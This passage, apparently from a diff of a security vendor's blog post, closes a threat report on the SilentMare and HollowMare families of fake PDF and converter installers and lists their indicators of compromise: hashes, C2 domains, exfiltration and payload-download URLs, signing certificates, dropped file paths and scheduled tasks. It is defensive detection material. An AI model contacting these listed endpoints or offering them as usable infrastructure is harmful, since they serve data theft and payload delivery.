+method, and they represent two different operating models. SilentMare is a
+beachhead. It installs a persistent updater that waits for a payload from the
+operator. HollowMare is a quick in-and-out. It hijacks the browser or
+force-installs an extension while the installer is running, and then leaves.&lt;/p&gt;
+&lt;p&gt;We have tracked SilentMare across three generations going back to 2024. The
+threat actor swaps out the implementation language and adjusts the
+cryptographic details between generations, but the operational pattern stays
+the same: a custom installer, a scheduled task, an updater that checks in once
+a day, and an AES-encrypted .NET payload that is loaded directly from memory.
+We have not been able to retrieve a payload from any of the C2 servers, so the
+end goal remains unknown.&lt;/p&gt;
+&lt;p&gt;HollowMare is different. The installer does the malicious work itself, and
+there is no second stage. The earliest variant installs a browser extension by
+driving the browser window with synthetic keystrokes. Later variants modify a
+file in the browser&amp;rsquo;s profile folder to hijack the default search engine. The
+most recent variant we identified, SagePDF, returns to the keystroke-injection
+method but drops persistence entirely. Because the only observed effect is
+search engine hijacking or extension installation, we classify HollowMare as a
+PUA rather than malware.&lt;/p&gt;
+&lt;p&gt;The two families&amp;rsquo; infrastructure has overlaps but no code is shared. The
+application-hosting domains for SilentMare and HollowMare applications are
+returned by the same servers based on Validin response-header pivots. The
+signing certificates are issued to Israeli entities based in Tel Aviv and
+neighboring cities, with names that follow a similar format. This is not enough
+to conclude that the same threat actor is behind both families. Our assessment
+is that they either share the same suppliers for certificates and landing
+pages, or they supply a third party that uses their tooling.&lt;/p&gt;
+&lt;p&gt;From a defender&amp;rsquo;s perspective, the distinction between malware and PUA is not
+useful here. A user has no way to tell, before installing, whether a downloaded
+PDF tool will hijack their search engine, upload their documents to an unknown
+server, or wait for a stealer payload. Even the applications that provide a
+functional feature do so by sending the user&amp;rsquo;s files to a server. &lt;strong&gt;None of
+these applications should be allowed in an enterprise environment&lt;/strong&gt;.&lt;/p&gt;
+&lt;h2&gt;IOCs&lt;span class="hx:absolute hx:-mt-20" id="iocs"&gt;&lt;/span&gt;
+&lt;a href="#iocs" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;ul&gt;
+&lt;li&gt;&lt;a href="silent_mare.csv"&gt;Silent Mare CSV&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href="hollow_mare.csv"&gt;Hollow Mare CSV&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Silent Mare&lt;span class="hx:absolute hx:-mt-20" id="silent-mare"&gt;&lt;/span&gt;
+&lt;a href="#silent-mare" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;type value comment
+sha256 08b9f93000512b45f8c2e8d3d6624536b366e67c40fd4b958db58e3a1d129c3d ConvertMate installer file hash
+domain banifuri.com C2 domain contacted by ConvertMate installer
+domain chrialletworton.com Affiliate domain contacted by ConvertMate installer
+domain conmateapp.com Product website associated with ConvertMate installer
+url https://banifuri.com/get-known-values C2 configuration fetch URL contacted by ConvertMate installer
+url https://banifuri.com/log C2 telemetry exfiltration URL contacted by ConvertMate installer
+url https://banifuri.com/pixel C2 conversion tracking pixel URL contacted by ConvertMate installer
+url https://chrialletworton.com/524c5f6f-7ad4-4468-a535-e7598d5af5a3 Affiliate redirect URL launched by ConvertMate installer
+certificate.subject AMARYLLIS SIGNAL LTD ConvertMate installer code-signing certificate subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 ConvertMate installer code-signing certificate issuer
+certificate.serial 77632688bc1b58d31bc7df0d ConvertMate installer code-signing certificate serial
+filepath %LOCALAPPDATA%\ConvertMate\ Install directory created by ConvertMate installer
+filepath %LOCALAPPDATA%\ConvertMate\id.txt User ID file dropped by ConvertMate installer
+filepath %LOCALAPPDATA%\ConvertMate\Convert Mate.exe Main app dropped by ConvertMate installer
+filepath %LOCALAPPDATA%\ConvertMate\UpdateRetreiver.exe Updater dropped by ConvertMate installer
+filepath %LOCALAPPDATA%\ConvertMate\Uninstaller.exe Uninstaller dropped by ConvertMate installer
+filepath %LOCALAPPDATA%\ConvertMate\favicon.ico Favicon dropped by ConvertMate installer
+filepath %LOCALAPPDATA%\ConvertMate\conmate_update.ps1 PowerShell script temporarily dropped by ConvertMate installer
+filepath %DESKTOP%\Convert Mate.lnk Desktop shortcut created by ConvertMate installer
+scheduled_task ConvertMateTask Scheduled task created by ConvertMate installer for daily updater execution
+sha256 09c2af472ab86b62a702e94a39df2bef09205f4249ed871cbeece751c1e7ef4f ConvertMate updater UpdateRetreiver.exe
+domain confetly.com ConvertMate updater C2 domain
+url https://confetly.com/auth ConvertMate updater authentication endpoint
+url https://confetly.com/update ConvertMate updater encrypted payload download
+url https://confetly.com/is5m ConvertMate updater success status reporting
+url https://confetly.com/iserr ConvertMate updater error status reporting
+certificate.subject AMARYLLIS SIGNAL LTD ConvertMate updater code-signing certificate subject (EV GlobalSign)
+certificate.issuer GlobalSign ConvertMate updater code-signing certificate issuer
+certificate.serial 77632688bc1b58d31bc7df0d ConvertMate updater code-signing certificate serial
+filepath %APPDATA%\ConvertMate\id.txt ConvertMate updater reads user ID and install date
+filepath UpdateRetreiver.exe ConvertMate updater binary filename (misspelled Retriever)
+sha256 ecf876ac0225934c183cdf76f55f0ba2d1c5cf86a52d2ba882cdc33eda11f878 Easy2Convert installer main binary
+domain caliberti.com Easy2Convert installer C2 domain
+domain www.ez2convertapp.com Easy2Convert installer product website
+url https://caliberti.com/client Easy2Convert installer C2 configuration endpoint
+url https://caliberti.com/variables Easy2Convert installer C2 telemetry beacon endpoint
+url https://www.ez2convertapp.com/toconvert-eula Easy2Convert installer EULA page
+url https://www.ez2convertapp.com/toconvert-privacy Easy2Convert installer privacy policy page
+certificate.subject BLUE TAKIN LTD Easy2Convert installer code-signing certificate subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 Easy2Convert installer code-signing certificate issuer
+certificate.serial 0a6047dea944141527d85e24 Easy2Convert installer code-signing certificate serial
+filepath %LOCALAPPDATA%\Easy2Conver\ Easy2Convert installer installation directory
+filepath %LOCALAPPDATA%\Easy2Conver\Easy2Convert.exe Easy2Convert installer self-copy
+filepath %LOCALAPPDATA%\Easy2Conver\Easy2ConvertUpdater.exe Easy2Convert installer dropped persistent updater
+filepath %LOCALAPPDATA%\Easy2Conver\Uninstall.exe Easy2Convert installer dropped uninstaller
+filepath %LOCALAPPDATA%\Easy2Conver\u.txt Easy2Convert installer persistent UUID tracking file
+filepath %USERPROFILE%\Desktop\Easy2Convert.lnk Easy2Convert installer desktop shortcut
+scheduled_task Easy2ConvertTask Easy2Convert installer COM-based scheduled task running every 10 minutes
+sha256 27262f4bf8096f04e53309d4ce603cfbeb27ed10abdf1c461d3ccb14e012f61e Easy2Convert updater binary (Easy2ConvertUpdater.exe)
+domain hiko.lakienti.com Easy2Convert updater C2 domain
+url https://hiko.lakienti.com/check-for-updates Easy2Convert updater C2 check-in endpoint
+url https://hiko.lakienti.com/get-update Easy2Convert updater encrypted payload download endpoint
+url https://hiko.lakienti.com/status-ok Easy2Convert updater success reporting endpoint
+url https://hiko.lakienti.com/status-bad Easy2Convert updater failure reporting endpoint
+certificate.subject BLUE TAKIN LTD Easy2Convert updater code-signing certificate subject
+certificate.issuer GlobalSign Easy2Convert updater code-signing certificate issuer (EV)
+certificate.serial 0a6047dea944141527d85e24 Easy2Convert updater code-signing certificate serial
+filepath %APPDATA%\Easy2Convert\u.txt Easy2Convert updater user ID and timestamp source file
+filepath Easy2ConvertUpdater.exe Easy2Convert updater binary filename
+sha256 5810795a6596bfe8059a9e499ee5e4b7341207d8eb0b4a4f6dbc6c0f60de71c2 PDF Skills installer PDFSkills.exe
+domain val.skillcli.com PDF Skills installer C2 config domain
+domain cbn.skillcli.com PDF Skills installer C2 telemetry domain
+domain visit.keyguardai.com PDF Skills installer affiliate domain
+domain www.pdfskillsapp.com PDF Skills installer product/thank-you domain
+url https://val.skillcli.com/v6 PDF Skills installer C2 configuration retrieval (XOR-encrypted)
+url https://cbn.skillcli.com/r PDF Skills installer telemetry exfiltration (XOR-encrypted)
+url https://visit.keyguardai.com/click?pid=496&amp;amp;offer_id=14039178 PDF Skills installer KeyGuard AI affiliate URL
+url https://www.pdfskillsapp.com/thanks?userid=&amp;lt;GUID&amp;gt; PDF Skills installer post-install thank-you page
+certificate.subject RED ROOT LTD PDF Skills installer code signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 PDF Skills installer code signing cert issuer
+certificate.serial 6838e670ea30dfa3294ea278 PDF Skills installer code signing cert serial (expired 2025-02-26)
+filepath %APPDATA%\PDFSkills\ PDF Skills installer admin install directory
+filepath %LOCALAPPDATA%\PDFSkills\ PDF Skills installer non-admin install directory
+filepath &amp;lt;InstallDir&amp;gt;\Update.exe PDF Skills installer dropped malware loader stub
+filepath &amp;lt;InstallDir&amp;gt;\Update.dll PDF Skills installer dropped malware loader DLL
+filepath &amp;lt;InstallDir&amp;gt;\PDFSkillsApp.exe PDF Skills installer dropped legitimate PDF app
+filepath &amp;lt;InstallDir&amp;gt;\Uninstall.exe PDF Skills installer dropped uninstaller
+filepath &amp;lt;InstallDir&amp;gt;\Updates.zip PDF Skills installer dropped (then deleted) payload archive
+filepath &amp;lt;InstallDir&amp;gt;\update_task.ps1 PDF Skills installer dropped PowerShell task script (admin)
+filepath &amp;lt;InstallDir&amp;gt;\update_task_ad.ps1 PDF Skills installer dropped PowerShell task script (non-admin)
+filepath &amp;lt;InstallDir&amp;gt;\skillsUserId.txt PDF Skills installer persistent user ID file
+filepath %APPDATA%\SMCR\userId.txt PDF Skills installer backup user ID file
+filepath %DESKTOP%\PDFSkillsApp.lnk PDF Skills installer desktop shortcut
+scheduled_task UpdateTaskZT PDF Skills installer daily persistence task executing Update.exe
+sha256 876a7e9c2d54eea24720d6554a864db6aab12f30fe135598c16f8c23a8a7baf7 PDF Skills updater Update.exe managed stub
+sha256 5ad036c7f0f52bc70187b00bf92c0eb8a2fbbc34a69d4f06e313ac451387b513 PDF Skills updater Update.dll native loader
+domain pwrtail.com PDF Skills updater primary C2 domain
+domain cbn.skillcli.com PDF Skills updater telemetry C2 domain
+url https://pwrtail.com/update/auth PDF Skills updater C2 authentication endpoint
+url https://pwrtail.com/update/download PDF Skills updater C2 payload download endpoint
+url https://cbn.skillcli.com/r PDF Skills updater telemetry exfiltration endpoint
+filepath %APPDATA%\PDFSkills\skillsUserId.txt PDF Skills updater persistent user ID file read
+filepath %LOCALAPPDATA%\PDFSkills\skillsUserId.txt PDF Skills updater alternate user ID file location
+filepath %APPDATA%\PDFSkills\PDFSkillsApp.exe PDF Skills updater installation date source
+filepath %APPDATA%\PDFSkills PDF Skills updater application data folder
+filepath Update.exe PDF Skills updater managed loader binary
+filepath Update.dll PDF Skills updater native/mixed-mode loader DLL
+sha256 a8df2614154fb621c8e63df63d6aa9251eb6f184151d118a60b0dc902a4bd021 Rapid Doc updater (HibbyRAT) RapiddocUpdater.exe
+domain segataw.com Rapid Doc updater C2 domain
+url https://segataw.com/ Rapid Doc updater base C2 URL
+url https://segataw.com/auth_product Rapid Doc updater authentication beacon endpoint
+url https://segataw.com/gupdate Rapid Doc updater encrypted payload delivery endpoint
+url https://segataw.com/product_report Rapid Doc updater telemetry reporting endpoint
+filepath %LOCALAPPDATA%\Rapidoc\ Rapid Doc updater persistence directory
+filepath %LOCALAPPDATA%\Rapidoc\rapidoc-file.txt Rapid Doc updater GUID fingerprint file
+sha256 84459f055a271cf9229ff0aa82981b47a2870f1ea6307a6078a30ae67eae1762 Zap PDF installer (Zapdf.exe)
+domain alexinok.com Zap PDF installer C2 domain
+domain zappdfapp.com Zap PDF installer product website (EULA/privacy)
+url https://alexinok.com/hwmi Zap PDF installer C2 configuration fetch endpoint
+url https://alexinok.com/agg Zap PDF installer telemetry exfiltration endpoint
+url https://alexinok.com/Zp2s Zap PDF installer Chrome detection signal endpoint
+url https://alexinok.com/zpdfupd Zap PDF installer updater download endpoint (base64 ZIP)
+url https://www.zappdfapp.com/zap-eula? Zap PDF installer EULA page
+url https://www.zappdfapp.com/zap-privacy? Zap PDF installer privacy policy page
+filepath %LOCALAPPDATA%\Zapdf\ Zap PDF installer install directory
+filepath %LOCALAPPDATA%\Zapdf\Zapdf.exe Zap PDF installer main application dropped
+filepath %LOCALAPPDATA%\Zapdf\Zapdf_txt.txt Zap PDF installer user ID (GUID) file
+filepath %LOCALAPPDATA%\Zapdf\ZapUpdater\ZapUpdater.exe Zap PDF installer downloaded updater binary
+filepath %LOCALAPPDATA%\Zapdf\extract Zap PDF installer temp base64-decoded ZIP path
+filepath %DESKTOP%\Zapdf.lnk Zap PDF installer desktop shortcut
+scheduled_task Zapdf Zap PDF installer daily persistence scheduled task (runs ZapUpdater.exe)
+sha256 912479bf09b5c7454ac6c052e539c30924454ad1129861bf7e16f48eeee733ef Zap PDF updater ZapUpdater.exe main loader
+sha256 e1e27af7b07eeedf5ce71a9255f0422816a6fc5849a483c6714e1b472044fa9d Zap PDF updater embedded Newtonsoft.Json.dll (legitimate dependency)
+domain domenget.com Zap PDF updater C2 domain
+url https://domenget.com/ Zap PDF updater C2 base URL
+url https://domenget.com/login Zap PDF updater C2 login endpoint
+url https://domenget.com/post Zap PDF updater C2 payload download endpoint
+url https://domenget.com/pdata Zap PDF updater C2 metrics telemetry endpoint
+filepath %LOCALAPPDATA%\Application\config.dat Zap PDF updater formatted timestamp storage
+filepath %LOCALAPPDATA%\Zapdf\Zapdf_txt.txt Zap PDF updater persistent victim GUID file
+filepath %LOCALAPPDATA%\Zapdf\ Zap PDF updater created directory
+filepath %LOCALAPPDATA%\Application\ Zap PDF updater created directory
+sha256 2014c84faf5d71a5a5cc77713e136e1ebe789565aa12ce0731a8add53bca078f ZipThis installer main binary
+domain apb.thisilient.com ZipThis installer C2 config subdomain
+domain can.thisilient.com ZipThis installer C2 telemetry subdomain
+domain sts.thisilient.com ZipThis installer conversion tracking subdomain
+domain www.zipthisapp.com ZipThis installer product domain
+domain visit.keyguardai.com ZipThis installer affiliate domain
+url https://apb.thisilient.com/v6 ZipThis installer C2 configuration retrieval (XOR-encrypted)
+url https://can.thisilient.com/r ZipThis installer telemetry exfiltration (XOR-encrypted)
+url https://sts.thisilient.com/st ZipThis installer conversion tracking pixel
+url &amp;#34;https://visit.keyguardai.com/click?pid=496&amp;amp;offer_id=14039178&amp;#34; ZipThis installer KeyGuard AI affiliate URL
+url https://www.zipthisapp.com/success?u=&amp;lt;GUID&amp;gt; ZipThis installer post-install success page
+url https://www.zipthisapp.com/see-you-later ZipThis installer uninstall page
+certificate.subject LIGHTNER TOK LTD ZipThis installer code signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 ZipThis installer code signing cert issuer
+certificate.serial 4469809aa0e206829c99cd18 ZipThis installer code signing cert serial (expired 2025-02-21)
+filepath &amp;lt;InstallDir&amp;gt;\Updater.exe ZipThis installer dropped persistent updater/loader
+filepath &amp;lt;InstallDir&amp;gt;\ZipThisApp.exe ZipThis installer dropped main app
+filepath &amp;lt;InstallDir&amp;gt;\Uninstall.exe ZipThis installer dropped uninstaller
+filepath &amp;lt;InstallDir&amp;gt;\update_task.ps1 ZipThis installer dropped non-admin scheduled task script
+filepath &amp;lt;InstallDir&amp;gt;\update_task_ad.ps1 ZipThis installer dropped admin scheduled task script
+filepath &amp;lt;InstallDir&amp;gt;\zipthisUserId.txt ZipThis installer persistent user ID file
+filepath %APPDATA%\SMCR\userId.txt ZipThis installer shared backup user ID (cross-product with PDFSkills)
+filepath %DESKTOP%\ZipThisApp.lnk ZipThis installer desktop shortcut
+filepath ziptest.txt ZipThis installer test-run indicator file
+filepath %APPDATA%\ZipThis\ ZipThis installer admin install folder
+filepath %LOCALAPPDATA%\ZipThis\ ZipThis installer non-admin install folder
+filepath Updates.zip ZipThis installer embedded payload archive (contains Updater.exe)
+scheduled_task UpdateTaskZT ZipThis installer daily scheduled task running Updater.exe
+sha256 cbdfe04b8f754e5e6150936ee604f0a478b79c6d0466ee155775ead575adea90 ZipThis updater Updater.exe managed stub
+sha256 27a7ba032f7d6cf787454c2fd036c95d13be9fb489b26fd9050659aa23498dd6 ZipThis updater Updater.dll native loader
+domain tzpdld.com ZipThis updater primary C2 domain
+domain can.thisilient.com ZipThis updater telemetry C2 domain
+url https://tzpdld.com/update/auth ZipThis updater C2 authentication endpoint
+url https://tzpdld.com/update/download ZipThis updater C2 payload download endpoint
+url https://can.thisilient.com/r ZipThis updater telemetry exfiltration endpoint
+certificate.subject LIGHTNER TOK LTD ZipThis updater Updater.exe code-signing certificate subject (EV GlobalSign expired 2025-02-21)
+certificate.serial 4469809aa0e206829c99cd18 ZipThis updater Updater.exe code-signing certificate serial
+filepath %APPDATA%\ZipThis\zipthisUserId.txt ZipThis updater persistent user ID file read
+filepath %LOCALAPPDATA%\ZipThis\zipthisUserId.txt ZipThis updater alternate user ID file location
+filepath %APPDATA%\ZipThis\ZipThisApp.exe ZipThis updater installation date timestamp source
+filepath Updater.exe ZipThis updater managed stub binary
+filepath Updater.dll ZipThis updater native loader DLL&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
+&lt;/div&gt;
+&lt;h3&gt;Hollow Mare&lt;span class="hx:absolute hx:-mt-20" id="hollow-mare"&gt;&lt;/span&gt;
+&lt;a href="#hollow-mare" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
+&lt;div&gt;&lt;pre&gt;&lt;code&gt;type value comment
+sha256 287a3a052ff0b2c495658fa90c5a9bd76f16d832d82138f6f8e87f9e2f578ab1 SagePDF installer file hash
+domain ralogoto.com SagePDF installer C2 domain
+url https://ralogoto.com/SGP SagePDF installer C2 config URL
+url https://ralogoto.com/SGPD SagePDF installer C2 telemetry URL
+certificate.subject Chrono Orion LTD SagePDF installer code-signing certificate subject
+certificate.issuer Sectigo Public Code Signing CA EV R36 SagePDF installer code-signing certificate issuer
+certificate.serial 009c2bafbcb665dc15d00e2767278e1656 SagePDF installer code-signing certificate serial
+filepath %TEMP%\SagePdf\SageId.txt SagePDF installer user ID file
+filepath %TEMP%\UID\UID.txt SagePDF installer legacy user ID file
+filepath %TEMP%\Sage.Files.Pron.ico SagePDF installer dropped icon file
+filepath %USERPROFILE%\Desktop\&amp;lt;AppNick&amp;gt;.lnk SagePDF installer dropped desktop shortcut
+sha256 9ee6348755a9162f52d79a9ddac460d35f071cbe5bf074d8e88a3c6d07cd8af9 SagePDF Stage 2 encrypted resource Sage.Resources.MainProcessLib.enc
+sha256 c0c7640bab371f198a6bbe58e1cfb124877eb73e27084f66e0d35ae2ed47c650 SagePDF Stage 2 decrypted MainProcessLib.dll
+filepath C:\Git\v4_application\V4_Application\MainProcessLib\obj\Release\MainProcessLib.pdb SagePDF Stage 2 PDB build path from MainProcessLib.dll
+certificate.subject Chrono Orion LTD SagePDF Stage 2 code signing certificate subject (Israel)
+sha256 3d82200083a86df09c3b16c9095b844738a76863b1b01092b6c4dbef3b974b12 ConvertyFile stealer/browser extension installer (BanditStealer)
+domain olienti.com ConvertyFile C2 server
+domain convertyfileapp.com ConvertyFile fake product website
+url https://olienti.com/vars ConvertyFile C2 victim registration endpoint
+url https://olienti.com/pass ConvertyFile C2 data exfiltration endpoint
+url https://olienti.com/boom ConvertyFile C2 success reporting endpoint
+url https://www.convertyfileapp.com/converty-thank-you ConvertyFile post-install redirect (thank-you page)
+certificate.subject &amp;#34;TAU CENTAURI LTD Central District Ra&amp;#39;anana IL&amp;#34; ConvertyFile code-signing certificate subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 ConvertyFile code-signing certificate issuer
+certificate.serial 115d73560ce2dd101d5bd925 ConvertyFile code-signing certificate serial
+filepath %TEMP%\ConvertyFile\CFInfo.txt ConvertyFile dropped persistent victim UUID file
+filepath %TEMP%\ConvertyFile\favicon.ico ConvertyFile dropped extracted icon
+filepath %TEMP%\ConvertyFile\uninstall.exe ConvertyFile dropped extracted uninstaller
+filepath %USERPROFILE%\Desktop\ConvertyFile.lnk ConvertyFile created desktop shortcut (persistence)
+sha256 598da788600747cf3fa1f25cb4fa1e029eca1442316709c137690e645a0872bb CrystalPDF stealer/installer main binary
+sha256 0f76f6a9f7c2575f9312953d37b51a8e1a7cc38a0758e272deef25bd6593306e CrystalPDF embedded decoy payload Crystal PDF.exe
+domain strongdwn.com CrystalPDF primary C2 (data theft &amp;#43; telemetry)
+domain negmari.com CrystalPDF attribution/tracking server
+domain cnvr.windwn.com CrystalPDF embedded payload conversion API
+url https://strongdwn.com/initiate CrystalPDF session initialization
+url https://strongdwn.com/convert CrystalPDF Firefox data exfiltration
+url https://strongdwn.com/merge CrystalPDF Chrome data exfiltration
+url https://strongdwn.com/abg CrystalPDF telemetry reporting
+url https://negmari.com/Cry CrystalPDF visit info / campaign attribution
+url https://negmari.com/st CrystalPDF event notification
+url https://cnvr.windwn.com/api CrystalPDF embedded payload PDF conversion API
+certificate.subject VAST LAKE LTD CrystalPDF outer binary code-signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 CrystalPDF outer binary code-signing cert issuer
+certificate.serial 032a466477d8c628044fd4b6 CrystalPDF outer binary code-signing cert serial
+certificate.subject LONG SOUND LTD CrystalPDF embedded payload code-signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 CrystalPDF embedded payload code-signing cert issuer
+certificate.serial 56ed9a94b87a7231b56f6a02 CrystalPDF embedded payload code-signing cert serial
+filepath %AppData%\FMCR\userId.txt CrystalPDF victim ID persistence file
+filepath %AppData%\FMCR\ CrystalPDF malware data directory
+filepath %AppData%\file_backup.txt CrystalPDF Firefox data theft transient backup
+filepath %AppData%\myfile_backup.txt CrystalPDF Chrome data theft transient backup
+filepath %LocalAppData%\temp\crys\CrystalPDF.exe CrystalPDF staged malware copy for scheduled task persistence
+filepath %Desktop%\Crystal PDF.exe CrystalPDF dropped decoy/benign payload on Desktop
+filepath %USERPROFILE%\Downloads\*.pdf CrystalPDF embedded payload output auto-opened
+scheduled_task Crystal_updater CrystalPDF daily persistence task running updater role
+sha256 e8b89b9fc60dc8ddb861369a7ab2cc319f23495022c4d1feb6e0cc4f3a87214c OneZip installer/stealer (BanditStealer)
+domain oneoni.com OneZip primary C2 telemetry
+domain zalp.oneoni.com OneZip secondary C2 session/data theft
+url https://oneoni.com/oz-st OneZip initial check-in (SendVS)
+url https://oneoni.com/oz-rep OneZip telemetry report (SendMap)
+url https://zalp.oneoni.com/start OneZip session initiation
+url https://zalp.oneoni.com/ OneZip stealer exfiltration endpoint
+certificate.subject G.R.CIGAR. LTD OneZip code signing subject (IL Herzliya)
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 OneZip code signing issuer
+certificate.serial 11776a855f0ee7dbe11e08e1 OneZip code signing serial
+filepath %TEMP%\O\OZInfo.txt OneZip persistent victim UUID file
+filepath %TEMP%\onezip\uninstall.exe OneZip installation marker
+filepath %LOCALAPPDATA%\Temp\onezip\uninstall.exe OneZip installation marker (alt)
+filepath %USERPROFILE%\Desktop\OneZip.lnk OneZip desktop shortcut persistence
+filepath file_backup.txt OneZip backup of stolen Firefox profile file
+sha256 cb42e3a751ff526912bb41337a9205cbe145f5fe80869341c79d5358c863c549 PDFDoc installer/adware main binary
+domain cliedoc.com PDFDoc installer C2 domain
+domain bolb.cliedoc.com PDFDoc installer C2 subdomain
+url https://bolb.cliedoc.com/PDoc PDFDoc installer C2 config endpoint
+certificate.subject TAMARISK INTERACTIVE LTD PDFDoc installer code-signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 PDFDoc installer code-signing cert issuer
+certificate.serial 58ef7daed3c6f44b1339b5f3 PDFDoc installer code-signing cert serial
+filepath %DESKTOP%\PDFDoc.lnk PDFDoc installer dropped desktop shortcut
+filepath %TEMP%\Doc.Files.Pron.ico PDFDoc installer dropped shortcut icon
+filepath %TEMP%\DocID\DocID.txt PDFDoc installer dropped machine GUID file
+filepath %TEMP%\...\UID.txt PDFDoc installer dropped machine identifier file
+sha256 865e689218d52d0d179659c1a9929231f9f4af0738835f768aff4242818b5a02 PowerDoc installer
+sha256 84f4a3abbda52c9e4cda6232d05d0b07406f6b4f2c2432cc34b153a663eb20bb PowerDoc dropped native.exe (cover app)
+sha256 136876316fa5da917ab4d3b5b694dff98250d9f6b2151660a2b558bea870b0c0 PowerDoc dropped uninstall.exe
+domain ulinikio.com PowerDoc primary C2
+domain lmbd.ulinikio.com PowerDoc data exfiltration C2
+domain itayh.ulinikio.com PowerDoc API for native.exe
+domain www.getpowerdoc.com PowerDoc fake product website
+domain getpowerdoc.com PowerDoc uninstall redirect
+url https://ulinikio.com/SlaPwrV PowerDoc installer config fetch
+url https://ulinikio.com/SlaPwrLog PowerDoc installer telemetry exfil
+url https://ulinikio.com/SlaPwrSuc PowerDoc installer success beacon
+url https://lmbd.ulinikio.com/run PowerDoc installer session init
+url https://lmbd.ulinikio.com/docMSlav PowerDoc installer data exfil
+url https://itayh.ulinikio.com/powerdoc/ PowerDoc native.exe PDF API
+url https://www.getpowerdoc.com/powerd-welcome PowerDoc installer post-install welcome page
+url https://getpowerdoc.com/powerd-goodbye PowerDoc uninstaller goodbye page
+certificate.subject GOLD HARMONY LTD PowerDoc installer/dropper signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 PowerDoc installer/dropper signing cert issuer
+certificate.serial 4a6df66704fbd9b656c11ab6 PowerDoc installer/dropper signing cert serial
+filepath %LocalAppData%\pwrDoc\PowerDoc.exe PowerDoc dropped cover application
+filepath %LocalAppData%\pwrDoc\uninstall.exe PowerDoc dropped uninstaller
+filepath %LocalAppData%\pwrDoc\PowerDocIco.ico PowerDoc dropped icon
+filepath %LocalAppData%\pwrDoc\pwrDoc.txt PowerDoc machine GUID persistence file
+filepath %AppData%\myfile_backup.txt PowerDoc transient backup during browser file replacement
+filepath %Desktop%\PowerDoc.lnk PowerDoc installer desktop shortcut
+sha256 cf1ea5d89495986f22cda4b87170a97afecc662293554b15493c11a1520153d6 PowerPlayer installer
+domain kolimau.com PowerPlayer installer C2
+domain haha.kolimau.com PowerPlayer installer payload delivery
+url https://kolimau.com/PowerPlayer-strings PowerPlayer installer C2 config fetch
+url https://kolimau.com/PowerPlayer PowerPlayer installer telemetry exfil
+url https://kolimau.com/Conv PowerPlayer installer conversion tracking
+url https://haha.kolimau.com/api/action/PowerPlayerLatestVersion PowerPlayer installer payload download
+certificate.subject TAMARISK INTERACTIVE LTD PowerPlayer installer code-signing cert subject
+certificate.issuer GlobalSign GCC R45 EV CodeSigning CA 2020 PowerPlayer installer code-signing cert issuer
+certificate.serial 32650e4c7423c72bda9565bf PowerPlayer installer code-signing cert serial
+filepath %TEMP%\PwrId\PwrId.txt PowerPlayer installer persistent victim GUID
+filepath %TEMP%\PowerPlayer.zip PowerPlayer installer downloaded payload archive
+filepath %TEMP%\PowerPlayer\NativePowerPlayer.exe PowerPlayer installer extracted companion binary
+filepath %TEMP%\PowerPlayer\UninstallPP.exe PowerPlayer installer uninstaller
+filepath %USERPROFILE%\Desktop\PowerPlayer.lnk PowerPlayer installer desktop shortcut &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;button
+class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
+title="Copy code"
+aria-label="Copy code"
+data-copied-label="Copied!"
+&gt;
+&lt;div class="hextra-copy-icon hx:group-[.copied]/copybtn:hidden hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;div class="hextra-success-icon hx:hidden hx:group-[.copied]/copybtn:block hx:pointer-events-none hx:h-4 hx:w-4"&gt;&lt;/div&gt;
+&lt;/button&gt;
+&lt;/div&gt;
